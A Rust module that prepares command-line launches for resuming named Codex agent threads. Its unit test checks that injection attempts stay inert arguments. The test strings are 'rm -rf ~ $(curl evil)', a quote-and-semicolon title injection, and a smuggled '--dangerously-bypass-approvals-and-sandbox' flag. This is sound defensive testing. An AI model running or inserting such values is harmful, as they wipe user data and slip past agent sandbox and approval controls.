//! Creates named Codex threads and prepares resume launches.

use pwf_application::pending_work::session::{self, AgentLaunch, AgentProbe, CodexSessionClient};

use super::{
    super::codex_app_server::{NamedCodexThread, start_and_name_thread},
    argv::LaunchArgv,
    probe,
};
use crate::session::{CodexThreadPreparationError, codex_reasoning_effort::CodexReasoningEffort};

const BINARY: &str = "codex";
const THREAD_ID_PREVIEW: &str = "<thread-id returned by thread/start>";

struct CodexLaunchPlan {
    title: String,
    repository: String,
    model: Option<String>,
    effort: CodexReasoningEffort,
    prompt: String,
}

impl From<&AgentLaunch> for CodexLaunchPlan {
    fn from(launch: &AgentLaunch) -> Self {
        Self {
            title: launch.title.clone(),
            repository: launch.repository.clone(),
            model: launch.model.clone(),
            effort: launch.effort.into(),
            prompt: launch.prompt.clone(),
        }
    }
}

/// Probes Codex and prepares named-thread resume launches.
#[derive(Debug, Clone, Copy, Default)]
pub struct CodexHarness;

impl CodexHarness {
    /// Probes the Codex binary.
    #[must_use]
    pub fn probe() -> AgentProbe {
        probe(BINARY)
    }

    /// Returns the exact prepared Codex argv for previewing.
    #[must_use]
    pub fn preview(launch: &AgentLaunch) -> Vec<String> {
        let plan = CodexLaunchPlan::from(launch);
        resume_argv(plan, THREAD_ID_PREVIEW.to_string())
    }

    /// Creates and names a Codex thread, then prepares its resume argv.
    ///
    /// # Errors
    ///
    /// Returns an error when app-server startup, initialization, thread creation, naming, cleanup,
    /// or shutdown fails.
    pub fn prepare(
        launch: &AgentLaunch,
    ) -> Result<PreparedCodexLaunch, CodexThreadPreparationError> {
        Self::prepare_with_binary(launch, BINARY)
    }

    fn prepare_with_binary(
        launch: &AgentLaunch,
        app_server_binary: &str,
    ) -> Result<PreparedCodexLaunch, CodexThreadPreparationError> {
        let plan = CodexLaunchPlan::from(launch);
        let named_thread = start_and_name_thread(
            app_server_binary,
            &plan.title,
            &plan.repository,
            plan.model.as_deref(),
            plan.effort,
        )?;
        Ok(PreparedCodexLaunch::from_named_thread(named_thread, plan))
    }
}

impl CodexSessionClient for CodexHarness {
    type Error = CodexThreadPreparationError;

    fn probe(&self) -> AgentProbe {
        Self::probe()
    }

    fn preview(&self, launch: &AgentLaunch) -> Vec<String> {
        Self::preview(launch)
    }

    fn prepare(&self, launch: &AgentLaunch) -> Result<session::PreparedCodexLaunch, Self::Error> {
        let prepared = Self::prepare(launch)?;
        Ok(session::PreparedCodexLaunch::new(
            prepared.thread_id,
            prepared.argv,
        ))
    }
}

/// Contains a named Codex thread's resume argv.
pub struct PreparedCodexLaunch {
    thread_id: String,
    argv: Vec<String>,
}

impl PreparedCodexLaunch {
    fn from_named_thread(named_thread: NamedCodexThread, plan: CodexLaunchPlan) -> Self {
        let thread_id = named_thread.into_id();
        Self {
            argv: resume_argv(plan, thread_id.clone()),
            thread_id,
        }
    }

    /// Returns the prepared argv.
    #[must_use]
    pub fn argv(&self) -> &[String] {
        &self.argv
    }

    /// Returns the named thread ID.
    #[must_use]
    pub fn thread_id(&self) -> &str {
        &self.thread_id
    }
}

fn resume_argv(plan: CodexLaunchPlan, thread_id: String) -> Vec<String> {
    let mut argv = LaunchArgv::new(BINARY).positional("resume");
    if let Some(model) = plan.model {
        argv = argv.flag("--model", model);
    }
    argv = argv.flag(
        "-c",
        format!("model_reasoning_effort=\"{}\"", plan.effort.as_str()),
    );
    argv.positional(thread_id).into_guarded(plan.prompt)
}

#[cfg(test)]
mod tests {
    use pwf_application::pending_work::session::{Agent, AgentLaunch, SessionEffort};

    use super::CodexHarness;
    #[cfg(unix)]
    use crate::session::codex_app_server::{AppServerFixture, OWNED_THREAD_ID};

    #[test]
    #[cfg(unix)]
    fn prepares_named_id_model_and_hostile_values_as_separate_arguments() {
        let fixture = AppServerFixture::successful();
        let launch = AgentLaunch {
            agent: Agent::Codex,
            task_id: "PWF-0068".to_string(),
            title: "\"; thread/delete everything".to_string(),
            repository: "/repo".to_string(),
            prompt: "; rm -rf ~ $(curl evil)\n--dangerously-bypass-approvals-and-sandbox"
                .to_string(),
            model: Some("gpt-8-billion".to_string()),
            effort: SessionEffort::XHigh,
        };

        let prepared =
            CodexHarness::prepare_with_binary(&launch, fixture.binary.to_str().unwrap()).unwrap();

        assert_eq!(
            prepared.argv(),
            [
                "codex",
                "resume",
                "--model",
                "gpt-8-billion",
                "-c",
                "model_reasoning_effort=\"xhigh\"",
                OWNED_THREAD_ID,
                "--",
                "; rm -rf ~ $(curl evil)\n--dangerously-bypass-approvals-and-sandbox",
            ]
        );
        assert_eq!(prepared.thread_id(), OWNED_THREAD_ID);
        let requests = fixture.requests();
        assert_eq!(requests[2]["params"]["cwd"], "/repo");
        assert_eq!(requests[2]["params"]["model"], "gpt-8-billion");
        assert_eq!(
            requests[2]["params"]["config"]["model_reasoning_effort"],
            "xhigh"
        );
        assert_eq!(
            requests[3]["params"]["name"],
            "\"; thread/delete everything"
        );
    }
}
